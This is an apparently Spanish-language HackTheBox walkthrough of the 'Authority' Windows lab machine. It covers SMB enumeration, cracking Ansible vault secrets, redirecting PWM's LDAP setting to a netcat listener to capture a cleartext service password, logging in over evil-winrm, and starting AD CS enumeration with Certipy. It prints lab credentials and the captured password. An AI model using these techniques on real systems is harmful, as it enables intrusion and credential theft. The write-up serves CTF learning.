---
layout: post
title: "HackTheBox - Authority (medium)"
categories: hackthebox/machines/medium
---

<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/e6257bbacb2ddd56f5703bb61eadd8cb.png">
</p>

- Authority is a medium-difficulty Windows machine that highlights the dangers of misconfigurations, password reuse, storing credentials on shares, and demonstrates how default settings in Active Directory (such as the ability for all domain users to add up to 10 computers to the domain) can be combined with other issues (vulnerable AD CS certificate templates) to take over a domain.

## PortScan

```bash
❯ sudo nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49673,49690,49691,49692,49693,49699,49700,49716,59430 10.10.11.222 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-10 17:03 CST
Nmap scan report for 10.10.11.222
Host is up (0.17s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-11 03:03:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2024-07-11T03:04:55+00:00; +3h59m39s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2024-07-11T03:04:53+00:00; +3h59m40s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2024-07-11T03:04:55+00:00; +3h59m39s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2024-07-11T03:04:53+00:00; +3h59m40s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
8443/tcp  open  ssl/https-alt
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2024-07-09T02:50:28
|_Not valid after:  2026-07-11T14:28:52
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Thu, 11 Jul 2024 03:03:52 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Thu, 11 Jul 2024 03:03:50 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Thu, 11 Jul 2024 03:03:50 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Thu, 11 Jul 2024 03:03:58 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
|_ssl-date: TLS randomness does not represent time
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
59430/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94SVN%T=SSL%I=7%D=7/10%Time=668F136A%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/htm
SF:l;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Thu,\x2011\x2
SF:0Jul\x202024\x2003:03:50\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n
SF:\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm'
SF:\"/></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x
SF:20GET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x2
SF:0Thu,\x2011\x20Jul\x202024\x2003:03:50\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\
SF:x20text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Th
SF:u,\x2011\x20Jul\x202024\x2003:03:52\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0
SF:;URL='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20
SF:\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en
SF:\r\nContent-Length:\x201936\r\nDate:\x20Thu,\x2011\x20Jul\x202024\x2003
SF::03:58\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x2
SF:0lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\
SF:x20Request</title><style\x20type=\"text/css\">body\x20{font-family:Taho
SF:ma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgro
SF:und-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px
SF:;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:
SF:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}
SF:</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x
SF:20Request</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x2
SF:0Report</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x20
SF:the\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p><
SF:p><b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x2
SF:0process\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20p
SF:erceived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\
SF:x20request\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3h59m39s, deviation: 0s, median: 3h59m38s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-07-11T03:04:43
|_  start_date: N/A
```

## Enumeración

- Vamos a comenzar enumerando la máquina ya que tiene muchos puertos abiertos.

```bash
❯ cme ldap 10.10.11.222
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
```

- Vamos agregar los dominios al `/etc/hosts`.

```bash
❯ echo "10.10.10.222 authority.htb authority.htb.corp DC.authority.htb dc.authority.htb" | sudo tee -a /etc/hosts
authority.htb authority.htb.corp DC.authority.htb dc.authority.htb
```

- Si enumeramos recursos compartidos por `smb` vemos los siguientes.

```bash
❯ smbclient -N -L //10.10.11.222

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Department Shares Disk
	Development     Disk
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.222 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

- Si analizamos el contenido de `Department Shares` vemos que no tenemos acceso.

```bash
❯ smbmap -H 10.10.11.222 -u 'xd' -p '' -r 'Department Shares' --no-banner
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.10.11.222:445	Name: 10.10.11.222        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Department Shares                                 	NO ACCESS	
	Development                                       	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share
	SYSVOL                                            	NO ACCESS	Logon server share
```

- Sin embargo en el recurso `Development` si tenemos permisos de lectura.

```bash
❯ smbclient //10.10.11.222/Development -U xd%xd
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Mar 17 07:20:38 2023
  ..                                  D        0  Fri Mar 17 07:20:38 2023
  Automation                          D        0  Fri Mar 17 07:20:40 2023

		5888511 blocks of size 4096. 1132344 blocks available
smb: \> cd Automation
smb: \Automation\> dir
  .                                   D        0  Fri Mar 17 07:20:40 2023
  ..                                  D        0  Fri Mar 17 07:20:40 2023
  Ansible                             D        0  Fri Mar 17 07:20:50 2023

		5888511 blocks of size 4096. 1129444 blocks available
smb: \Automation\> cd Ansible
smb: \Automation\Ansible\> dir
  .                                   D        0  Fri Mar 17 07:20:50 2023
  ..                                  D        0  Fri Mar 17 07:20:50 2023
  ADCS                                D        0  Fri Mar 17 07:20:48 2023
  LDAP                                D        0  Fri Mar 17 07:20:48 2023
  PWM                                 D        0  Fri Mar 17 07:20:48 2023
  SHARE                               D        0  Fri Mar 17 07:20:48 2023

		5888511 blocks of size 4096. 1185756 blocks available
smb: \Automation\Ansible\>
```

- Dentro de Share encontramos otro recurso que se llama `tasks` donde encontramos un `.yml` vamos a descargarlo.

```bash
smb: \Automation\Ansible\Share\> cd tasks\
smb: \Automation\Ansible\Share\tasks\> dir
  .                                   D        0  Fri Mar 17 07:20:48 2023
  ..                                  D        0  Fri Mar 17 07:20:48 2023
  main.yml                            A     1876  Thu Sep 22 01:04:00 2022

		5888511 blocks of size 4096. 1254895 blocks available
smb: \Automation\Ansible\Share\tasks\> get main.yml
getting file \Automation\Ansible\Share\tasks\main.yml of size 1876 as main.yml (2.1 KiloBytes/sec) (average 2.1 KiloBytes/sec)
smb: \Automation\Ansible\Share\tasks\>
```

- Este es el contenido.

```bash
❯ cat main.yml
    - name: Make subdirectories under Share
      ansible.windows.win_file:
        path: "{{item}}"
        state: directory
      loop:
        - C:\Share\Internal
        - C:\Share\Internal\IT\Public
        - C:\Share\Internal\IT\Private
        - C:\Share\Internal\HR\Public
        - C:\Share\Internal\HR\Private
        - C:\Share\Internal\R&D\Public
        - C:\Share\Internal\R&D\Private
        - C:\Share\Internal\Marketing\Public
        - C:\Share\Internal\Marketing\Private
        - C:\Share\Internal\Finance\Public
        - C:\Share\Internal\Finance\Private
        - C:\Share\Internal\Executives\Public
        - C:\Share\Internal\Executives\Private
        - C:\Share\Internal\Accounting\Public
        - C:\Share\Internal\Accounting\Private

    - name: Make user folders for all users
      ansible.windows.win_powershell:
        script: |
          $path = "C:\Share\"
          $users = (Get-ADUser -Filter * ).Name
          foreach ($user in $users) {
            New-Item -ItemType Directory -Force -Path $path\$user}

    - name: Create User Share
      win_share:
          name: '{{item.share_name}}'
          description: '{{item.share_description}}'
          path: '{{item.path}}'
          list: '{{item.list}}'
          full: '{{item.full}}'
          read: '{{item.read}}'
      with_items:
        - {path: 'C:\Share', share_name: 'User Share', share_description: 'Share for Users', full: 'Administrators, Domain Users', read: 'Domain Users', list: no }

    - name: Enable inherited ACL
      ansible.windows.win_acl_inheritance:
        path: C:\Share
        state: present

    - name: ACL
      ansible.windows.win_acl:
        path: C:\Share
        user: Administrator, Domain Users
        rights: Full Control
        type: 'Allow'
        inherit:  None
        propagation: 'None'
```

>El script de Ansible main.yml está diseñado para automatizar la creación de una estructura de carpetas para distintos departamentos y usuarios en un servidor Windows, así como para configurar los permisos de acceso y compartir el directorio principal C:\Share con los usuarios del dominio y administradores.

- Dentro de `pwn` hay varios archivos interesantes donde mencionan mucho ansible vamos a descargarlos para analizarlos mejor en nuestra máquina de atacante.

```bash
smb: \Automation\Ansible\PWM\> dir
  .                                   D        0  Fri Mar 17 07:20:48 2023
  ..                                  D        0  Fri Mar 17 07:20:48 2023
  ansible.cfg                         A      491  Thu Sep 22 00:36:58 2022
  ansible_inventory                   A      174  Wed Sep 21 17:19:32 2022
  defaults                            D        0  Fri Mar 17 07:20:48 2023
  handlers                            D        0  Fri Mar 17 07:20:48 2023
  meta                                D        0  Fri Mar 17 07:20:48 2023
  README.md                           A     1290  Thu Sep 22 00:35:58 2022
  tasks                               D        0  Fri Mar 17 07:20:48 2023
  templates                           D        0  Fri Mar 17 07:20:48 2023
```

```bash
smb: \Automation\Ansible\> prompt off
smb: \Automation\Ansible\> recurse true
smb: \Automation\Ansible\> mget PWM
getting file \Automation\Ansible\PWM\ansible.cfg of size 491 as PWM/ansible.cfg (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
getting file \Automation\Ansible\PWM\ansible_inventory of size 174 as PWM/ansible_inventory (0.2 KiloBytes/sec) (average 0.4 KiloBytes/sec)
getting file \Automation\Ansible\PWM\README.md of size 1290 as PWM/README.md (1.4 KiloBytes/sec) (average 0.7 KiloBytes/sec)
getting file \Automation\Ansible\PWM\defaults\main.yml of size 1591 as PWM/defaults/main.yml (1.7 KiloBytes/sec) (average 1.0 KiloBytes/sec)
getting file \Automation\Ansible\PWM\handlers\main.yml of size 4 as PWM/handlers/main.yml (0.0 KiloBytes/sec) (average 0.8 KiloBytes/sec)
getting file \Automation\Ansible\PWM\meta\main.yml of size 199 as PWM/meta/main.yml (0.2 KiloBytes/sec) (average 0.7 KiloBytes/sec)
getting file \Automation\Ansible\PWM\tasks\main.yml of size 1832 as PWM/tasks/main.yml (1.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
getting file \Automation\Ansible\PWM\templates\context.xml.j2 of size 422 as PWM/templates/context.xml.j2 (0.6 KiloBytes/sec) (average 0.8 KiloBytes/sec)
getting file \Automation\Ansible\PWM\templates\tomcat-users.xml.j2 of size 388 as PWM/templates/tomcat-users.xml.j2 (0.5 KiloBytes/sec) (average 0.8 KiloBytes/sec)
```

- Encontramos credenciales <https://www.redhat.com/es/topics/automation/learning-ansible-tutorial>.

```bash
❯ cat ansible_inventory
ansible_user: administrator
ansible_password: Welcome1
ansible_port: 5985
ansible_connection: winrm
ansible_winrm_transport: ntlm
ansible_winrm_server_cert_validation: ignore
```

- Si las probamos no nos funcionan.

```bash
❯ cme winrm 10.10.11.222 -u administrator -p 'Welcome1'
SMB         10.10.11.222    5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
HTTP        10.10.11.222    5985   AUTHORITY        [*] http://10.10.11.222:5985/wsman
WINRM       10.10.11.222    5985   AUTHORITY        [-] authority.htb\administrator:Welcome1
```

- Dentro de `default` encontramos lo que parecen ser hashes <https://docs.ansible.com/ansible/latest/vault_guide/vault_encrypting_content.html>.

```bash
❯ cat main.yml
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764                         
```

- Vemos que nos hablan sobre `pwm_admin_login` si buscamos la ruta en la web existe.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/authority/1.png">
</p>

- Nos piden credenciales supongo que la contraseña debe ser la del algún vault <https://github.com/pwm-project/pwm>.

- Vamos generar los hashes con `ansible2john` <https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/>. 

```bash
❯ cat vault1
$ANSIBLE_VAULT;1.1;AES256
326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438

❯ cat vault2
$ANSIBLE_VAULT;1.1;AES256
313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531

❯ cat vault3
$ANSIBLE_VAULT;1.1;AES256
633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764
```

- Generamos los hashes.

```bash
❯ ansible2john vault1
vault1:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
❯ ansible2john vault2
vault2:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
❯ ansible2john vault3
vault3:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
```

- Si los crackeamos vemos que todos tiene la misma contraseña.

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (vault2)
!@#$%^&*         (vault1)
!@#$%^&*         (vault3)
3g 0:00:00:53 DONE (2024-07-10 17:56) 0.05621g/s 745.8p/s 2237c/s 2237C/s 051790..victor2
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- Ahora que tenemos la contraseña podemos hacer el `decrypt` al `Vault`.

```bash
❯ pipx install ansible-core
  installed package ansible-core 2.17.1, installed using Python 3.11.9
  These apps are now globally available
    - ansible
    - ansible-config
    - ansible-connection
    - ansible-console
    - ansible-doc
    - ansible-galaxy
    - ansible-inventory
    - ansible-playbook
    - ansible-pull
    - ansible-test
    - ansible-vault
done! ✨ 🌟 ✨
```

- Y tenemos credenciales.

```bash
❯ ansible-vault decrypt vault1
Vault password:
Decryption successful
❯ ls
❯ ansible-vault decrypt vault2
Vault password:
Decryption successful
❯ ansible-vault decrypt vault3
Vault password:
Decryption successful
❯ cat vault1
svc_pwm                                                                                 

❯ cat vault2
pWm_@dm!N_!23                                                                           

❯ cat vault3
DevT3st@123%            
```

- Si verificamos vemos que la credencial es correcta para el usuario pero no podemos listar recursos por `smb`.

```bash
❯ cme smb 10.10.11.222 -u svc_pwm -p 'pWm_@dm!N_!23'
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\svc_pwm:pWm_@dm!N_!23
❯ cme smb 10.10.11.222 -u svc_pwm -p 'pWm_@dm!N_!23' --shares
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\svc_pwm:pWm_@dm!N_!23
SMB         10.10.11.222    445    AUTHORITY        [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

- Sin embargo probando otros servicios tampoco nos deja.

```bash
❯ cme winrm 10.10.11.222 -u svc_pwm -p 'pWm_@dm!N_!23'
SMB         10.10.11.222    5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
HTTP        10.10.11.222    5985   AUTHORITY        [*] http://10.10.11.222:5985/wsman
WINRM       10.10.11.222    5985   AUTHORITY        [-] authority.htb\svc_pwm:pWm_@dm!N_!23
❯ cme ldap 10.10.11.222 -u svc_pwm -p 'pWm_@dm!N_!23'
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.222    445    AUTHORITY        [-] authority.htb\svc_pwm:pWm_@dm!N_!23 Error connecting to the domain, are you sure LDAP service is running on the target ?
```

- Si probamos las credenciales en el panel de login de `pwm` no nos deja entrar <https://github.com/pwm-project/pwm>.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/authority/2.png">
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/authority/3.png">
</p>

- Si le damos `click` en `Configuration Editor` nos lleva aquí.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/authority/4.png">
</p>

- Si pegamos la contraseña que tenemos y le damos a `Sign in` nos deja entrar.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/authority/5.png">
</p>

## Shell as svc_ldap and user flag

- Vemos que esta el usuario `svc_ldap` y la contraseña esta guardada allí como en la parte de LDAP `URLs` nos deja agregar un `Value` podemos poner nuestra `ip` y ponernos en escucha en el puerto que opera LDAP por defecto que es el `389`.

```bash
❯ nc -nlvp 389
listening on [any] 389 ...
```

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/authority/6.png">
</p>

- Después de la damos en `Save` y si nos vamos al `netcat` tenemos credenciales.

```bash
❯ nc -nlvp 389
listening on [any] 389 ...
connect to [10.10.14.74] from (UNKNOWN) [10.10.11.222] 61273
0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htblDaP_1n_th3_cle4r!
```

```bash
❯ cat creds.txt
svc_ldap:lDaP_1n_th3_cle4r!
```

- Son correctas y nos podemos conectar con `evil-winrm`.

```bash
❯ cme winrm 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
SMB         10.10.11.222    5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
HTTP        10.10.11.222    5985   AUTHORITY        [*] http://10.10.11.222:5985/wsman
WINRM       10.10.11.222    5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
```

- Vemos la flag.

```bash
❯ evil-winrm -i 10.10.11.222 -u svc_ldap -p lDaP_1n_th3_cle4r!

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> type C:\Users\svc_ldap\Desktop\user.txt
802832b5ae3b3fb19108fd495fdb7232
```

## Escalada de Privilegios

- Vemos un `.pfx` que es un archivo para almacenar certificados digitales y claves privadas de manera segura.

```bash
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/23/2023   6:16 PM                Certs
d-----        3/28/2023   1:59 PM                Department Shares
d-----        3/17/2023   9:20 AM                Development
d-----         8/9/2022   7:00 PM                inetpub
d-----        3/24/2023   8:22 PM                PerfLogs
d-r---        3/25/2023   1:20 AM                Program Files
d-----        3/25/2023   1:19 AM                Program Files (x86)
d-----        7/11/2024  12:24 AM                pwm
d-r---        3/24/2023  11:27 PM                Users
d-----        7/12/2023   1:19 PM                Windows
-a----        8/10/2022   8:44 PM       84784749 pwm-onejar-2.0.3.jar


*Evil-WinRM* PS C:\> cd Certs
*Evil-WinRM* PS C:\Certs> dir


    Directory: C:\Certs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/23/2023   6:11 PM           4933 LDAPs.pfx
```

- Como en otras máquinas tendremos que trabajar con ADCS (Active Directory Certificate Services) <https://github.com/ly4k/Certipy> podemos usar el .exe dentro de la máquina para identificar `templates` o hacerlo desde nuestra máquina de atacante.

```bash
❯ pipx install certipy-ad
```

- Ahora buscamos por `templates` vulnerables.

- Tenemos que agregar ese subdominio al `/etc/hosts`.

```bash
❯ certipy find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -target authority.htb -text -stdout -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[!] Failed to resolve: authority.authority.htb
```

- Ahora ya funciona.

```bash
❯ certipy find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -target authority.htb -text -stdout -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
